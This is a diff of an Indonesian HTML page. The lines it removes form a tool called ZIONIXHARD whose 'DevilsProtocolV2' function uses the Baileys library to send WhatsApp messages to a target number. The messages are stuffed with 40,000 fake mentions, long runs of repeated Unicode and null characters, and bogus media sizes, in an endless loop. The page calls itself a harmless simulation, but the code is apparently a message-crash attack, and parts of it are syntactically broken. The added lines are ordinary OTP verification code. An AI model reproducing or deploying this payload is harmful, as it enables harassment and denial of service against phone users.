@@ -1,256 +1,55 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8" />
-  <title>ZIONIXHARD</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #0f0f0f, #1c1c1c);
-      color: #eee;
-      max-width: 500px;
-      margin: 40px auto;
-      padding: 20px;
+<!-- Sama seperti sebelumnya, tapi: -->
+<script>
+  let verified = false;
+
+  async function kirimKode() {
+    const nomor = document.getElementById('nomor').value.trim();
+    const status = document.getElementById('status');
+
+    if (!/^62[0-9]{9,15}$/.test(nomor)) {
+      status.innerText = "❌ Nomor tidak valid.";
+      return;
     }
 
-    h1 {
-      text-align: center;
-      font-size: 28px;
-      color: #00ffee;
-      text-shadow: 0 0 10px #00ffee;
-      margin-bottom: 30px;
-    }
+    status.innerText = "⏳ Mengirim kode OTP...";
 
-    label {
-      font-weight: bold;
-      margin-top: 15px;
-      display: block;
-    }
-
-    input {
-      width: 100%;
-      padding: 12px;
-      margin-top: 5px;
-      border-radius: 10px;
-      background: #1a1a1a;
-      border: none;
-      color: white;
-      font-size: 16px;
-      box-shadow: inset 0 0 5px #333;
-    }
-
-    .btn {
-      display: block;
-      width: 100%;
-      padding: 14px;
-      margin-top: 25px;
-      font-size: 16px;
-      font-weight: bold;
-      background: linear-gradient(135deg, #00ffcc, #0055ff, #00ffcc);
-      background-size: 300% 300%;
-      animation: pulse 3s ease infinite;
-      color: black;
-      border: none;
-      border-radius: 15px;
-      cursor: pointer;
-      transition: 0.3s ease;
-    }
-
-    .btn:hover {
-      transform: scale(1.03);
-      filter: brightness(1.1);
-    }
-
-    @keyframes pulse {
-      0% {background-position: 0% 50%}
-      50% {background-position: 100% 50%}
-      100% {background-position: 0% 50%}
-    }
-
-    .status {
-      margin-top: 15px;
-      font-size: 14px;
-      text-align: center;
-      font-weight: bold;
-      color: #00ffaa;
-    }
-
-    .note {
-      margin-top: 35px;
-      padding: 15px;
-      font-size: 12px;
-      background: #111;
-      color: #aaa;
-      border-left: 4px solid #00ffee;
-      border-radius: 6px;
-    }
-  </style>
-</head>
-<body>
-
-  <h1>ZIONIXHARD</h1>
-
-  <label for="sender">Nomor Pengirim</label>
-  <input id="sender" placeholder="Contoh: 6288881234567" />
-
-  <label for="target">Nomor Target</label>
-  <input id="target" placeholder="Contoh: 6281234567890" />
-
-  <button class="btn" onclick="kirimBug()">🚀 Kirim Unicode Blank</button>
-
-  <div id="status" class="status"></div>
-
-  <div class="note">
-    ⚠️ <strong>Catatan:</strong><br>
-    Ini adalah simulasi kirim bug Unicode WhatsApp berbasis HTML. Tidak mengandung crash atau eksploitasi berbahaya.<br>
-    Untuk versi backend nyata, hubungkan ke bot WhatsApp (misalnya menggunakan Baileys via Node.js di `/api/send`).
-  </div>
-
-  <script>
-    async function kirimBug() {
-      const sender = document.getElementById('sender').value.trim();
-      const target = document.getElementById('target').value.trim();
-      const status = document.getElementById('status');
-
-      if (!sender || !target || !sender.startsWith("62") || !target.startsWith("62")) {
-        status.innerText = "❌ Nomor pengirim dan target wajib diisi dengan awalan 62";
-        status.style.color = "red";
-        return;
-      }
-
-      status.innerText = "⏳ Mengirim Unicode blank...";
-      status.style.color = "#00ffaa";
-
-      // Simulasi pesan unicode blank
-      const pesanBlank = async function DevilsProtocolV2(sock, target, mention) {
-    const mentionjid = [
-    "9999999999@s.whatsapp.net",
-    ...Array.from({ length: 40000 }, () =>
-        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-    )
-];
-
-    const embeddedMusic = {
-        musicContentMediaId: "589608164114571",
-        songId: "870166291800508",
-        author: "Devils Protocols" + "᭄".repeat(10000),
-        title: "Version 2" + "᭄",
-        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
-        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
-        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
-        artistAttribution: "https://n.uguu.se/UnDeath.jpg",
-        countryBlocklist: true,
-        isExplicit: true,
-        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
-    };
-
-const devilsMesagge = {
-        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
-        mimetype: "video/mp4",
-        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
-        fileLength: "999999999999",
-        seconds: 999999,
-        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
-        caption: "𝕯𝖊𝖛𝖎𝖑𝖘 𝕻𝖗𝖔𝖙𝖔𝖈𝖔𝖑𝖘",
-        height: 640,
-        width: 640,
-        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
-        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1743848703",
-        contextInfo: {
-           externalAdReply: {
-              showAdAttribution: true,
-              title: `🥶`,
-              body: `${"\u0000".repeat(9117)}`,
-              mediaType: 1,
-              renderLargerThumbnail: true,
-              thumbnailUrl: null,
-              sourceUrl: "Https://t.me/malvinsock"
-        },
-           businessMessageForwardInfo: {
-              businessOwnerJid: target,
-        },
-            isSampled: true,
-            mentionedJid: mentionjid
-        },
-        forwardedNewsletterMessageInfo: {
-            newsletterJid: "120363406229895095@newsletter",
-            serverMessageId: 1,
-            newsletterName: `${"ꦾ".repeat(100)}`
-        },
-        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
-        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
-        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
-        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
-        annotations: [
-            {
-                embeddedContent: {
-                   embeddedMusic
-                },
-                embeddedAction: true
-            }
-        ]
-    };
-
-    const msg = generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: { devilsMesagge }
-        }
-    }, {});
-
-    await sock.relayMessage("status@broadcast", msg.message, {
-        messageId: msg.key.id,
-        statusJidList: [target],
-        additionalNodes: [
-            {
-                tag: "meta",
-                attrs: {},
-                content: [
-                    {
-                        tag: "mentioned_users",
-                        attrs: {},
-                        content: [
-                            { tag: "to", attrs: { jid: target }, content: undefined }
-                        ]
-                    }
-                ]
-            }
-        ]
+    const res = await fetch('/api/send-otp', {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ nomor })
     });
 
-    if (mention) {
-        await sock.relayMessage(target, {
-            groupStatusMentionMessage: {
-                message: {
-                    protocolMessage: {
-                        key: msg.key,
-                        type: 25
-                    }
-                }
-            }
-        }, {
-            additionalNodes: [
-                {
-                    tag: "meta",
-                    attrs: { is_status_mention: "true" },
-                    content: undefined
-                }
-            ]
-        });
+    const json = await res.json();
+    if (json.ok) {
+      status.innerText = "✅ Kode OTP telah dikirim via WhatsApp.";
+    } else {
+      status.innerText = `❌ Gagal kirim OTP: ${json.error}`;
     }
-}
+  }
 
-      // Simulasi "pengiriman"while (true) {
-await DevilsProtocolV2(target, true);
+  async function verifikasiKode() {
+    const kode = document.getElementById('kode').value.trim();
+    const nomor = document.getElementById('nomor').value.trim();
+    const status = document.getElementById('status');
 
-      console.log(`Dari: ${sender}`);
-      console.log(`Ke  : ${target}`);
-      console.log(`Pesan:\n${pesanBlank.slice(0, 100)}...`);
+    if (!kode) return status.innerText = "❌ Masukkan kode OTP";
 
-      status.innerText = `✅ Pesan blank berhasil "dikirim" ke ${target}`;
+    // Kirim ke backend untuk diverifikasi
+    const res = await fetch('/api/verif-otp', {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ nomor, kode })
+    });
+
+    const json = await res.json();
+    if (json.ok) {
+      verified = true;
+      document.getElementById('pesan').disabled = false;
+      document.getElementById('btn-kirim').disabled = false;
+      document.getElementById('verif-status').style.display = "block";
+      status.innerText = "✅ Verifikasi berhasil.";
+    } else {
+      status.innerText = "❌ Kode salah atau kadaluarsa.";
     }
-  </script>
-
-</body>
-</html>
+  }
+</script>
